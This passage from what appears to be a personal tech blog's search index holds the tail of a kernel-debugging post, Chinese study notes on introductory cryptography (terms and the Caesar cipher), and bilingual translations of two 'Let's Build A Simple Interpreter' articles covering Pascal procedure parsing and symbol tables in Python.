至此，gdb如何调试内核及内核模块的基操就完了，其他操作与用户态调试没有太大区别。 参考文献 https://pawnyable.cafe/linux-kernel/introduction/introduction.html https://pawnyable.cafe/linux-kernel/introduction/debugging.html ","link":"https://lzxzl.github.io/post/pawnyable1-linux-kernel-pwn-jian-jie-yu-diao-shi-huan-jing-da-jian/"},{"title":"《图解密码技术》第1-2章 - 笔记","content":"第1章 环游密码世界 1.2 密码 发送者（sender）：当某个人向另一个人发送信息时，发出信息的人称为发送者。 接收者（receiver）：收到信息的人称为接收者。 消息（message）：被发送的信息 窃听者（eavesdropper）：在发送邮件时，邮件会经过多台计算机和通信设备进行中转，在这个过程中就存在被恶意窃听者偷看到的可能性。 明文（plaintext）：加密之前的消息。 密文（ciphertext）：加密之后的消息。 加密（encrypt） 解密（decrypt） 密码（cryptography）技术可保证机密性（ confidentiality） 密码破译（cryptanalysis）：简称破译，有时也称为密码分析。接受者以外的其他人将密文还原成明文。 破译者（ cryptanalyst）：进行破译的人，不一定是坏人，也可能是密码学研究者。他们为了研究密码强度（破译密码的困难程度）也会成为破译者。 1.3 对称密码与公钥密码 算法（algorithm）：解决复杂问题的步骤。 加密算法：加密的步骤 解密算法：解密的步骤 密码算法：加密算法和解密算法合在一起的统称 密钥（key） 对称密码（symmetric cryptography）：在加密和解密时使用同一密钥的方式。 又称公共密钥密码（common-key cryptography）、传统密码（conventional cryptography）、私钥密码（secret-key cryptography）、共享密钥密码（shared-keycryptography） 公钥密码（public-key cryptography）：在加密和解密时使用不同密钥的方式。 又称非对称密码（asymmetric cryptography） 混合密码系统（hybrid cryptosystem）：将对称密码和公钥密码结合起来的密码方式。 1.4 其他密码技术 密码技术提供的并不仅仅是基于密码的机密性，用于校验消息是否被篡改的完整性、以及用于确认是否是本人的认证等都是密码技术的重要部分。 单向散列函数（one-way hash function） 散列值（hash）：用单向散列函数计算出来的数值 又称哈希值、密码校验和（cryptographic checksum）、指纹（fingerprint）、消息摘要（message digest） 单向散列函数保证的并不是机密性，而是完整性（integrity）。 完整性：“数据是正派的而不是伪造的” 消息认证码（message authentication code）：作用是确认消息是否来自所期望的通信对象。 不仅能够保证完整性，还能提供认证（authentication）机制 数字签名（digital signature）：一种将现实世界中的签名和盖章移植到数字世界中的技术 能够防止伪装（spoofing）、篡改和否认（repudiation）等威胁 一种能够确保完整性、提供认证并防止否认的密码技术 伪随机数生成器（Pseudo Random Number Generator，PRNG）：一种能够模拟产生随机数列的算法。 随机数承担着密钥生成的重要职责。 1.5 密码学家的工具箱 信息安全所面临的威胁与应对这些威胁的密码技术 1.6 隐写术与数字水印 密码：让消息内容变得无法解读 隐写术（steganography）：隐藏消息本身 数字水印：一种将著作权拥有者及购买者的信息嵌入文件中的技术 1.7 密码与信息安全常识 不要使用保密的密码算法 使用低强度的密码比不进行任何加密更危险 任何密码总有一天都会被破解 密码只是信息安全的一部分 第2章 历史上的密码 2.1 凯撒密码 凯撒密码（Caesar cipher）：通过将明文中所使用的字母表按照一定的字数“平移”来进行加密。 凯撒密码的加密 凯撒密码的解密 暴力破解凯撒密码：如果不知道密钥，那么可通过暴力破解来破译 ","link":"https://lzxzl.github.io/post/lesslesstu-jie-mi-ma-ji-zhu-greatergreater-di-1-2-zhang-bi-ji/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part 12.","content":" “Be not afraid of going slowly; be afraid only of standing still.” - Chinese proverb. “不怕慢，只怕原地踏步”——中国谚语。 Hello, and welcome back! 大家好，欢迎回来！ Today we are going to take a few more baby steps and learn how to parse Pascal procedure declarations. 今天，我们将走更多的baby step，并学习如何解析 Pascal 过程声明（procedure declarations）。 What is a procedure declaration? A procedure declaration is a language construct that defines an identifier (a procedure name) and associates it with a block of Pascal code. 什么是过程声明？过程声明是一种语言结构，它定义了一个标识符(过程名称) ，并将其与一组 Pascal 代码关联起来。 Before we dive in, a few words about Pascal procedures and their declarations: 在我们深入讨论之前，先简单介绍一下 Pascal 的procedures及其声明: Pascal procedures don’t have return statements. They exit when they reach the end of their corresponding block. Pascal 过程没有返回语句，它们在到达相应块的末尾时退出 Pascal procedures can be nested within each other. Pascal 过程可以相互嵌套 For simplicity reasons, procedure declarations in this article won’t have any formal parameters. But, don’t worry, we’ll cover that later in the series. 为了简单起见，本文中的过程声明没有任何形参。但是，不要担心，我们将在本系列的后面讨论这个问题。 This is our test program for today: 这是我们今天的测试程序: PROGRAM Part12; VAR a : INTEGER; PROCEDURE P1; VAR a : REAL; k : INTEGER; PROCEDURE P2; VAR a, z : INTEGER; BEGIN {P2} z := 777; END; {P2} BEGIN {P1} END; {P1} BEGIN {Part12} a := 10; END. {Part12} As you can see above, we have defined two procedures (P1 and P2) and P2 is nested within P1. In the code above, I used comments with a procedure’s name to clearly indicate where the body of every procedure begins and where it ends. 正如您在上面看到的，我们已经定义了两个过程(P1和 P2) ，P2嵌套在 P1中。在上面的代码中，我使用带有过程名称的注释来清楚地指出每个过程的主体开始和结束的位置。 Our objective for today is pretty clear: learn how to parse a code like that. 我们今天的目标很明确: 学习如何解析这样的代码。 First, we need to make some changes to our grammar to add procedure declarations. Well, let’s just do that! 首先，我们需要对grammar进行一些修改，以添加过程声明！ Here is the updated declarations grammar rule: 下面是更新的 declarations grammar规则: The procedure declaration sub-rule consists of the reserved keyword PROCEDURE followed by an identifier (a procedure name), followed by a semicolon, which in turn is followed by a block rule, which is terminated by a semicolon. Whoa! This is a case where I think the picture is actually worth however many words I just put in the previous sentence! 😃 过程声明子规则包括保留关键字 PROCEDURE 后跟标识符(过程名称) ，后跟分号，分号后跟block规则，以分号结束。哇！在这种情况下，无论我在前面的句子中加入多少字，我都认为图片是值得的！😃 Here is the updated syntax diagram for the declarations rule: 下面是更新后的declarations规则语法图: From the grammar and the diagram above you can see that you can have as many procedure declarations on the same level as you want. For example, in the code snippet below we define two procedure declarations, P1 and P1A, on the same level: 从上面的语法和图表中可以看到，您可以在同一级别上拥有任意多的过程声明。例如，在下面的代码片段中，我们在同一级别定义了两个过程声明，P1和 P1A： PROGRAM Test; VAR a : INTEGER; PROCEDURE P1; BEGIN {P1} END; {P1} PROCEDURE P1A; BEGIN {P1A} END; {P1A} BEGIN {Test} a := 10; END. {Test} The diagram and the grammar rule above also indicate that procedure declarations can be nested because the procedure declaration sub-rule references the block rule which contains the declarations rule, which in turn contains the procedure declaration sub-rule. As a reminder, here is the syntax diagram and the grammar for the block rule from Part10: 上面的图和语法规则也表明过程declarations可以嵌套，因为过程declarations子规则引用了包含declarations规则的block规则，而block规则又包含过程declarations子规则。提醒一下，下面是第10部分中block规则的语法图和语法: Okay, now let’s focus on the interpreter components that need to be updated to support procedure declarations: 好的，现在让我们关注一下需要更新以支持过程声明的解释器组件: Updating the Lexer 更新 Lexer All we need to do is add a new token named PROCEDURE: 我们所需要做的就是添加一个名为 PROCEDURE 的新token： And add ‘PROCEDURE’ to the reserved keywords. Here is the complete mapping of reserved keywords to tokens: 然后在保留关键字上添加‘ PROCEDURE’，这里是保留关键字到token的完整映射: RESERVED_KEYWORDS = { 'PROGRAM': Token('PROGRAM', 'PROGRAM'), 'VAR': Token('VAR', 'VAR'), 'DIV': Token('INTEGER_DIV', 'DIV'), 'INTEGER': Token('INTEGER', 'INTEGER'), 'REAL': Token('REAL', 'REAL'), 'BEGIN': Token('BEGIN', 'BEGIN'), 'END': Token('END', 'END'), 'PROCEDURE': Token('PROCEDURE', 'PROCEDURE'), } Updating the Parser 更新解析器 Here is a summary of the parser changes: 下面是解析器更改的摘要: New _ProcedureDecl _ AST node 新的_ProcedureDecl AST _节点 Update to the parser’s _declarations _method to support procedure declarations 更新解析器的declarations方法来支持过程声明 Let’s go over the changes. 我们来复习一下这些改动。 The ProcedureDecl AST node represents a procedure declaration. The class constructor takes as parameters the name of the procedure and the AST node of the block of code that the procedure’s name refers to. ProcedureDecl AST 节点表示一个过程声明。类构造函数接受procedure的名称和procedure名称引用的代码块的 AST 节点作为参数。 class ProcedureDecl(AST): def __init__(self, proc_name, block_node): self.proc_name = proc_name self.block_node = block_node Here is the updated declarations method of the Parser class 下面是 Parser 类的更新声明方法 def declarations(self): &quot;&quot;&quot;declarations : VAR (variable_declaration SEMI)+ | (PROCEDURE ID SEMI block SEMI)* | empty &quot;&quot;&quot; declarations = [] if self.current_token.type == VAR: self.eat(VAR) while self.current_token.type == ID: var_decl = self.variable_declaration() declarations.extend(var_decl) self.eat(SEMI) while self.current_token.type == PROCEDURE: self.eat(PROCEDURE) proc_name = self.current_token.value self.eat(ID) self.eat(SEMI) block_node = self.block() proc_decl = ProcedureDecl(proc_name, block_node) declarations.append(proc_decl) self.eat(SEMI) return declarations Hopefully, the code above is pretty self-explanatory. It follows the grammar/syntax diagram for procedure declarations that you’ve seen earlier in the article. 希望上面的代码非常容易理解。它遵循您在本文前面看到的过程声明的语法/语法图。 Updating the SymbolTable builder 更新 SymbolTable 生成器 Because we’re not ready yet to handle nested procedure scopes, we’ll simply add an empty visit_ProcedureDecl method to the SymbolTreeBuilder AST visitor class. We’ll fill it out in the next article. 因为我们还没有准备好处理嵌套的 procedure 域，我们只需要向_SymbolTreeBuilder AST visitor类添加一个空的_ _visit_ProcedureDecl _方法。我们将在下一篇文章中填写它。 def visit_ProcedureDecl(self, node): pass Updating the Interpreter 更新解释器 We also need to add an empty visit_ProcedureDecl method to the Interpreter class, which will cause our interpreter to silently ignore all our procedure declarations. 我们还需要在 Interpreter 类中添加一个空的 visit_ProcedureDecl 方法，这将导致我们的解释器静默地忽略所有的过程声明。 So far, so good. 到目前为止，一切顺利。 Now that we’ve made all the necessary changes, let’s see what the Abstract Syntax Tree looks like with the new ProcedureDecl nodes. 现在我们已经做了所有必要的修改，让我们来看看使用新的 ProcedureDecl 节点后的抽象语法树是什么样的。 Here is our Pascal program again (you can download it directly from GitHub): 下面是我们的 Pascal 程序(你可以直接从 GitHub 下载) : PROGRAM Part12; VAR a : INTEGER; PROCEDURE P1; VAR a : REAL; k : INTEGER; PROCEDURE P2; VAR a, z : INTEGER; BEGIN {P2} z := 777; END; {P2} BEGIN {P1} END; {P1} BEGIN {Part12} a := 10; END. {Part12} Let’s generate an AST and visualize it with the genastdot.py utility: 让我们生成一个 AST，并使用 genastdot.py 实用程序将其可视化: $ python genastdot.py part12.pas &gt; ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot In the picture above you can see two ProcedureDecl nodes: ProcDecl:P1 and ProcDecl:P2 that correspond to procedures P1 and P2. Mission accomplished. 😃 在上面的图片中，您可以看到两个 ProcedureDecl 节点: ProcDecl: P1和 ProcDecl: P2，它们对应于过程 P1和 P2。任务完成。😃 As a last item for today, let’s quickly check that our updated interpreter works as before when a Pascal program has procedure declarations in it. Download the interpreter and the test program if you haven’t done so yet, and run it on the command line. Your output should look similar to this: 作为今天的最后一项，让我们快速检查一下，当 Pascal 程序中包含过程声明时，我们更新的解释器是否像以前一样工作。下载解释器和测试程序(如果您还没有这样做的话) ，并在命令行上运行它。你的输出应该类似于这样: $ python spi.py part12.pas Define: INTEGER Define: REAL Lookup: INTEGER Define: &lt;a:INTEGER&gt; Lookup: a Symbol Table contents: Symbols: [INTEGER, REAL, &lt;a:INTEGER&gt;] Run-time GLOBAL_MEMORY contents: a = 10 Okay, with all that knowledge and experience under our belt, we’re ready to tackle the topic of nested scopes that we need to understand in order to be able to analyze nested procedures and prepare ourselves to handle procedure and function calls. And that’s exactly what we are going to do in the next article: dive deep into nested scopes. So don’t forget to bring your swimming gear next time! Stay tuned and see you soon! 好的，有了这些知识和经验，我们已经准备好处理嵌套作用域的主题，我们需要理解这些作用域，以便能够分析嵌套的过程，并为处理过程和函数调用做好准备。这正是我们在下一篇文章中要做的: 深入探究嵌套域。所以下次别忘了带上你的游泳装备！请继续关注，我们很快就会再见！ All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler Let's Build A Simple Interpreter. Part 15. Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part-12/"},{"title":"[翻译与学习] Let's Build A Simple Interpreter. Part 11.","content":"I was sitting in my room the other day and thinking about how much we had covered, and I thought I would recap what we’ve learned so far and what lies ahead of us. 有一天，我坐在房间里，想着我们学了多少东西，我想我应该重述一下我们到目前为止学到的东西，以及我们将要学到的东西。 Up until now we’ve learned: 到目前为止，我们已经了解到: How to break sentences into tokens. The process is called lexical analysis and the part of the interpreter that does it is called a lexical analyzer, lexer, scanner, or tokenizer. We’ve learned how to write our own lexer from the ground up without using regular expressions or any other tools like Lex. 如何将sentences分解成token。这个过程叫 词法分析，解释器的负责这部分的叫做 lexical analyzer, lexer, scanner, or tokenizer。 How to recognize a phrase in the stream of tokens. The process of recognizing a phrase in the stream of tokens or, to put it differently, the process of finding structure in the stream of tokens is called parsing or syntax analysis. The part of an interpreter or compiler that performs that job is called a parser or syntax analyzer. 如何在token流中识别一个phrase，或者说如何在token流中找到一个结构。这个过程叫做parsing或者syntax analysis（解析或者语法分析）。解释器负责这部分的叫做 parser 或者 syntax analyzer。 How to represent a programming language’s syntax rules with syntax diagrams, which are a graphical representation of a programming language’s syntax rules. Syntax diagrams visually show us which statements are allowed in our programming language and which are not. 如何用语法图表示一个编程语言的syntax规则。语法图可视化显示哪些语句是允许的，哪些是不允许的。 How to use another widely used notation for specifying the syntax of a programming language. It’s called context-free grammars (grammars, for short) or BNF (Backus-Naur Form). 如何使用另一种广泛使用的表示法来指定编程语言的syntax。被称为 上下文无关文法（grammars）或者_BNF_ (Backus-Naur Form)。 How to map a grammar to code and how to write a recursive-descent parser. 如何将grammar映射到code，以及如何写一个递归下降解析器。 How to write a really basic interpreter. 如何写一个真正的基础的解释器 How associativity and precedence of operators work and how to construct a grammar using a precedence table. 操作符的结合性和优先级如何工作，以及如何使用优先表构造语法。 How to build an Abstract Syntax Tree (AST) of a parsed sentence and how to represent the whole source program in Pascal as one big AST. 如何构造一个parsed sentence 的 AST，以及如何表示在一个AST中表示Pascal的整个源码项目。 How to walk an AST and how to implement our interpreter as an AST node visitor. 如何遍历AST，以及如何在我们的解释器中实现一个AST节点visitor。 With all that knowledge and experience under our belt, we’ve built an interpreter that can scan, parse, and build an AST and interpret, by walking the AST, our very first complete Pascal program. Ladies and gentlemen, I honestly think if you’ve reached this far, you deserve a pat on the back. But don’t let it go to your head. Keep going. Even though we’ve covered a lot of ground, there are even more exciting parts coming our way. 凭借我们所有的知识和经验，我们已经建立了一个解释器，它可以扫描、解析和构建一个 AST，并通过遍历 AST 来解释，这是我们第一个完整的 Pascal 程序。女士们，先生们，我真诚地认为，如果你们已经走到了这一步，你们应该得到鼓励。但是不要让它冲昏了你的头脑。继续。尽管我们已经涉及了很多领域，但还有更多令人兴奋的部分正在向我们走来。 With everything we’ve covered so far, we are almost ready to tackle topics like: 到目前为止，我们已经涵盖了所有的内容，我们几乎已经准备好处理以下主题: Nested procedures and functions 嵌套的过程和函数 Procedure and function calls 过程和函数调用 Semantic analysis (type checking, making sure variables are declared before they are used, and basically checking if a program makes sense) 语义分析(类型检查，确保在使用变量之前声明它们，基本上检查程序是否有意义) Control flow elements (like IF statements) 控制流元素（如 IF 语句） Aggregate data types (Records) 聚合数据类型(记录) More built-in types 更多内置类型 Source-level debugger 源代码级调试器 Miscellanea (All the other goodness not mentioned above 😃 杂集(上面没有提到的所有其他的goodness:) But before we cover those topics, we need to build a solid foundation and infrastructure. 但是在我们讨论这些主题之前，我们需要建立一个坚实的 foundation 和 infrastructure（基础架构）。 This is where we start diving deeper into the super important topic of symbols, symbol tables, and scopes. The topic itself will span several articles. It’s that important and you’ll see why. Okay, let’s start building that foundation and infrastructure, then, shall we? 我们从这里开始更深入地探讨符号、符号表和 域 这些超级重要的主题。这个主题本身将跨越几篇文章。这很重要，你会明白为什么的。好的，我们开始建造地基和基础架构，好吗？ First, let’s talk about symbols and why we need to track them. What is a symbol? For our purposes, we’ll informally define symbol as an identifier of some program entity like a variable, subroutine, or built-in type. For symbols to be useful they need to have at least the following information about the program entities they identify: 首先，让我们讨论一下符号以及为什么我们需要跟踪它们。什么是符号？出于我们的目的，我们将非正式地将 symbol 定义为某些程序实体(如变量、子例程或内置类型)的标识符。要使符号有用，它们至少需要有关于它们所识别的程序实体的下列信息: Name (for example, ‘x’, ‘y’, ‘number’) Name (例如，‘ x’、‘ y’、‘ number’) Category (Is it a variable, subroutine, or built-in type?) Category(它是变量、子例程还是内置类型?) Type (INTEGER, REAL) ( Type( 整数, 实数) Today we’ll tackle variable symbols and built-in type symbols because we’ve already used variables and types before. By the way, the “built-in” type just means a type that hasn’t been defined by you and is available for you right out of the box, like INTEGER and REAL types that you’ve seen and used before. 今天我们将讨论变量符号和内置type符号，因为我们以前已经使用过变量和type。顺便说一下，“内置”type只是指一种您没有定义，并可以立即使用的type，比如您以前看到和使用过的 INTEGER 和 REAL type。 Let’s take a look at the following Pascal program, specifically at the variable declaration part. You can see in the picture below that there are four symbols in that section: two variable symbols (x and y) and two built-in type symbols (INTEGER and REAL). 让我们看看下面的 Pascal 程序，特别是变量声明部分。您可以在下面的图片中看到该部分中有四个符号: 两个变量符号(x 和 y)和两个内置type符号(INTEGER 和 REAL)。 How can we represent symbols in code? Let’s create a base Symbol class in Python: 如何在代码中表示符号? 让我们用 Python 创建一个基本的 Symbol 类: class Symbol(object): def __init__(self, name, type=None): self.name = name self.type = type As you can see, the class takes the name parameter and an optional type parameter (not all symbols may have a type associated with them). What about the category of a symbol? We’ll encode the category of a symbol in the class name itself, which means we’ll create separate classes to represent different symbol categories. 如您所见，该类接受 name 参数和一个可选 type 参数(并非所有符号都可能具有与其关联的type)。那么符号的category呢？我们将在类名本身中对符号的category进行编码，这意味着我们将创建单独的类来表示不同的符号category。 Let’s start with basic built-in types. We’ve seen two built-in types so far, when we declared variables: INTEGER and REAL. How do we represent a built-in type symbol in code? Here is one option: 让我们从基本的内置type开始。到目前为止，在声明变量时，我们已经看到了两个内置类型: INTEGER 和 REAL。如何在代码中表示内置类型符号？这里有一个选择: class BuiltinTypeSymbol(Symbol): def __init__(self, name): super().__init__(name) def __str__(self): return self.name __repr__ = __str__ The class inherits from the Symbol class and the constructor requires only a name of the type. The category is encoded in the class name, and the type parameter from the base class for a built-in type symbol is None. The double underscore or dunder (as in “Double UNDERscore”) methods str and repr are special Python methods and we’ve defined them to have a nice formatted message when you print a symbol object. 类继承自 Symbol 类，构造函数只需要type的名称。category编码在类名中，内置type符号的基类的type参数为 None。双下划线或者 dunder (如“双下划线”)方法 str 和 repr 是特殊的 Python 方法，我们已经定义它们在打印符号对象时有一个漂亮的格式化消息。 Download the interpreter file and save it as spi.py; launch a python shell from the same directory where you saved the spi.py file, and play with the class we’ve just defined interactively: 下载解释器文件并将其保存为 spi.py; 从保存 spi.py 文件的同一个目录启动 python shell，并以交互方式使用我们刚刚定义的类: $ python &gt;&gt;&gt; from spi import BuiltinTypeSymbol &gt;&gt;&gt; int_type = BuiltinTypeSymbol('INTEGER') &gt;&gt;&gt; int_type INTEGER &gt;&gt;&gt; real_type = BuiltinTypeSymbol('REAL') &gt;&gt;&gt; real_type REAL How can we represent a variable symbol? Let’s create a VarSymbol class: 如何表示变量符号? 让我们创建一个 VarSymbol 类: class VarSymbol(Symbol): def __init__(self, name, type): super().__init__(name, type) def __str__(self): return '&lt;{name}:{type}&gt;'.format(name=self.name, type=self.type) __repr__ = __str__ In the class we made both the name and the type parameters required parameters and the class name VarSymbol clearly indicates that an instance of the class will identify a variable symbol (the category is variable.) 在类中，我们同时创建了name和type参数所需的参数，类名 VarSymbol 清楚地表明类的实例将识别一个变量符号(category是变量) Back to the interactive python shell to see how we can manually construct instances for our variable symbols now that we know how to construct BuiltinTypeSymbol class instances: 回到交互式 python shell，看看既然我们已经知道如何构造_BuiltinTypeSymbol_类实例，那如何手动构建变量符号的实例: $ python &gt;&gt;&gt; from spi import BuiltinTypeSymbol, VarSymbol &gt;&gt;&gt; int_type = BuiltinTypeSymbol('INTEGER') &gt;&gt;&gt; real_type = BuiltinTypeSymbol('REAL') &gt;&gt;&gt; &gt;&gt;&gt; var_x_symbol = VarSymbol('x', int_type) &gt;&gt;&gt; var_x_symbol &lt;x:INTEGER&gt; &gt;&gt;&gt; var_y_symbol = VarSymbol('y', real_type) &gt;&gt;&gt; var_y_symbol &lt;y:REAL&gt; As you can see, we first create an instance of a built-in type symbol and then pass it as a parameter to VarSymbol‘s constructor. 如您所见，我们首先创建一个内置type符号的实例，然后将其作为参数传递给 VarSymbol 的构造函数。 Here is the hierarchy of symbols we’ve defined in visual form: 下面是我们以视觉形式定义的符号层次: So far so good, but we haven’t answered the question yet as to why we even need to track those symbols in the first place. 到目前为止还不错，但是我们还没有回答为什么我们需要首先追踪这些符号的问题。 Here are some of the reasons: 以下是一些原因: To make sure that when we assign a value to a variable the types are correct (type checking) 为了确保在给变量赋值时，类型是正确的(类型检查) To make sure that a variable is declared before it is used 确保在使用变量之前声明该变量 Take a look at the following incorrect Pascal program, for example: 看看下面这个不正确的 Pascal 程序，例如: There are two problems with the program above (you can compile it with fpc to see it for yourself): 上面这个程序有两个问题(你可以用 fpc 编译它，自己看看) : In the expression _“x := 2 + y;” _ we assigned a decimal value to the variable “x” that was declared as integer. That wouldn’t compile because the types are incompatible. 在短语_x := 2 + y;_中，我们给声明为整数的变量“ x”赋了一个实数值。因为类型不兼容，所以不能编译 In the assignment statement _“x := a;” _we referenced the variable “a” that wasn’t declared - wrong! 在赋值语句_x := a;_中，我们引用了未被声明的变量“ a” To be able to identify cases like that even before interpreting/evaluating the source code of the program at run-time, we need to track program symbols. And where do we store the symbols that we track? I think you’ve guessed it right - in the symbol table! 为了能够在运行时解释/评估程序的源代码之前识别这样的情况，我们需要跟踪程序符号。我们在哪里存储我们追踪的符号？我想你已经猜对了——在符号表里！ What is a symbol table? A symbol table is an abstract data type (ADT) for tracking various symbols in source code. Today we’re going to implement our symbol table as a separate class with some helper methods: 什么是符号表？符号表是一个用于跟踪源代码中各种符号的抽象数据类型(ADT)。今天我们将使用一些 helper 方法将我们的符号表作为一个单独的类来实现: class SymbolTable(object): def __init__(self): self._symbols = {} def __str__(self): s = 'Symbols: {symbols}'.format( symbols=[value for value in self._symbols.values()] ) return s __repr__ = __str__ def define(self, symbol): print('Define: %s' % symbol) self._symbols[symbol.name] = symbol def lookup(self, name): print('Lookup: %s' % name) symbol = self._symbols.get(name) # 'symbol' is either an instance of the Symbol class or 'None' return symbol There are two main operations that we will be performing with the symbol table: storing symbols and looking them up by name: hence, we need two helper methods - define and lookup. 我们将使用符号表执行两个主要操作: 存储符号并按名称查找它们: 因此，我们需要两个helper 方法—— define 和 lookup。 The method define takes a symbol as a parameter and stores it internally in its _symbols ordered dictionary using the symbol’s name as a key and the symbol instance as a value. The method lookup takes a symbol name as a parameter and returns a symbol if it finds it or “None” if it doesn’t. 方法 define 将符号作为参数，并将其存储在符号名作为键和符号实例作为值的 _symbols 有序字典中。方法 lookup 接受一个符号名作为参数，如果找到它就返回一个符号，如果找不到就返回“ None”。 Let’s manually populate our symbol table for the same Pascal program we’ve used just recently where we were manually creating variable and built-in type symbols: 让我们为最近使用的 Pascal 程序手动填充符号表，我们手动创建变量和内置类型符号: PROGRAM Part11; VAR x : INTEGER; y : REAL; BEGIN END. Launch a Python shell again and follow along: 再次启动一个 Python shell，然后执行以下操作: $ python &gt;&gt;&gt; from spi import SymbolTable, BuiltinTypeSymbol, VarSymbol &gt;&gt;&gt; symtab = SymbolTable() &gt;&gt;&gt; int_type = BuiltinTypeSymbol('INTEGER') &gt;&gt;&gt; symtab.define(int_type) Define: INTEGER &gt;&gt;&gt; symtab Symbols: [INTEGER] &gt;&gt;&gt; &gt;&gt;&gt; var_x_symbol = VarSymbol('x', int_type) &gt;&gt;&gt; symtab.define(var_x_symbol) Define: &lt;x:INTEGER&gt; &gt;&gt;&gt; symtab Symbols: [INTEGER, &lt;x:INTEGER&gt;] &gt;&gt;&gt; &gt;&gt;&gt; real_type = BuiltinTypeSymbol('REAL') &gt;&gt;&gt; symtab.define(real_type) Define: REAL &gt;&gt;&gt; symtab Symbols: [INTEGER, &lt;x:INTEGER&gt;, REAL] &gt;&gt;&gt; &gt;&gt;&gt; var_y_symbol = VarSymbol('y', real_type) &gt;&gt;&gt; symtab.define(var_y_symbol) Define: &lt;y:REAL&gt; &gt;&gt;&gt; symtab Symbols: [INTEGER, &lt;x:INTEGER&gt;, REAL, &lt;y:REAL&gt;] If you looked at the contents of the _symbols dictionary it would look something like this: 如果你查看一下这个符号字典的内容，你会发现: How do we automate the process of building the symbol table? We’ll just write another node visitor that walks the AST built by our parser! This is another example of how useful it is to have an intermediary form like AST. Instead of extending our parser to deal with the symbol table, we separate concerns and write a new node visitor class. Nice and clean. 😃 我们如何将构建符号表的过程自动化？只需要编写另一个节点 visitor 来访问由解析器构建的 AST！这是另一个例子，说明使用类似 AST 的中间表示是多么有用。我们没有扩展解析器来处理符号表，而是分离关注点并编写一个新的节点visitor类。漂亮又干净。😃 Before doing that, though, let’s extend our SymbolTable class to initialize the built-in types when the symbol table instance is created. Here is the full source code for today’s SymbolTable class: 但是，在此之前，让我们扩展 SymbolTable 类，以便在创建符号表实例时初始化内置type。下面是今天的 SymbolTable 类的完整源代码: class SymbolTable(object): def __init__(self): self._symbols = OrderedDict() self._init_builtins() def _init_builtins(self): self.define(BuiltinTypeSymbol('INTEGER')) self.define(BuiltinTypeSymbol('REAL')) def __str__(self): s = 'Symbols: {symbols}'.format( symbols=[value for value in self._symbols.values()] ) return s __repr__ = __str__ def define(self, symbol): print('Define: %s' % symbol) self._symbols[symbol.name] = symbol def lookup(self, name): print('Lookup: %s' % name) symbol = self._symbols.get(name) # 'symbol' is either an instance of the Symbol class or 'None' return symbol Now onto the SymbolTableBuilder AST node visitor: 现在到 SymbolTableBuilder AST 节点visitor: class SymbolTableBuilder(NodeVisitor): def __init__(self): self.symtab = SymbolTable() def visit_Block(self, node): for declaration in node.declarations: self.visit(declaration) self.visit(node.compound_statement) def visit_Program(self, node): self.visit(node.block) def visit_BinOp(self, node): self.visit(node.left) self.visit(node.right) def visit_Num(self, node): pass def visit_UnaryOp(self, node): self.visit(node.expr) def visit_Compound(self, node): for child in node.children: self.visit(child) def visit_NoOp(self, node): pass def visit_VarDecl(self, node): type_name = node.type_node.value type_symbol = self.symtab.lookup(type_name) var_name = node.var_node.value var_symbol = VarSymbol(var_name, type_symbol) self.symtab.define(var_symbol) You’ve seen most of those methods before in the Interpreter class, but the visit_VarDecl method deserves some special attention. Here it is again: 你以前在 Interpreter 类中见过这些方法中的大多数，但是 visit_VarDecl 方法值得特别注意。再看看: def visit_VarDecl(self, node): type_name = node.type_node.value type_symbol = self.symtab.lookup(type_name) var_name = node.var_node.value var_symbol = VarSymbol(var_name, type_symbol) self.symtab.define(var_symbol) This method is responsible for visiting (walking) a VarDecl AST node and storing the corresponding symbol in the symbol table. First, the method looks up the built-in type symbol by name in the symbol table, then it creates an instance of the VarSymbol class and stores (defines) it in the symbol table. 此方法负责访问(遍历) VarDecl AST 节点并将相应的符号存储在符号表中。首先，该方法在 symbol 表中按名称查找内置type符号，然后创建 VarSymbol 类的实例，并将其存储(定义)到 symbol 表中。 Let’s take our SymbolTableBuilder AST walker for a test drive and see it in action: 让我们用 SymbolTableBuilder AST walker 作为一个测试驱动器，看看它是如何运行的: $ python &gt;&gt;&gt; from spi import Lexer, Parser, SymbolTableBuilder &gt;&gt;&gt; text = &quot;&quot;&quot; ... PROGRAM Part11; ... VAR ... x : INTEGER; ... y : REAL; ... ... BEGIN ... ... END. ... &quot;&quot;&quot; &gt;&gt;&gt; lexer = Lexer(text) &gt;&gt;&gt; parser = Parser(lexer) &gt;&gt;&gt; tree = parser.parse() &gt;&gt;&gt; symtab_builder = SymbolTableBuilder() Define: INTEGER Define: REAL &gt;&gt;&gt; symtab_builder.visit(tree) Lookup: INTEGER Define: &lt;x:INTEGER&gt; Lookup: REAL Define: &lt;y:REAL&gt; &gt;&gt;&gt; # Let’s examine the contents of our symbol table … &gt;&gt;&gt; symtab_builder.symtab Symbols: [INTEGER, REAL, &lt;x:INTEGER&gt;, &lt;y:REAL&gt;] In the interactive session above, you can see the sequence of “Define: …” and “Lookup: …” messages that indicate the order in which symbols are defined and looked up in the symbol table. The last command in the session prints the contents of the symbol table and you can see that it’s exactly the same as the contents of the symbol table that we’ve built manually before. The magic of AST node visitors is that they pretty much do all the work for you. 😃 在上面的交互式会话中，您可以看到“ Define: 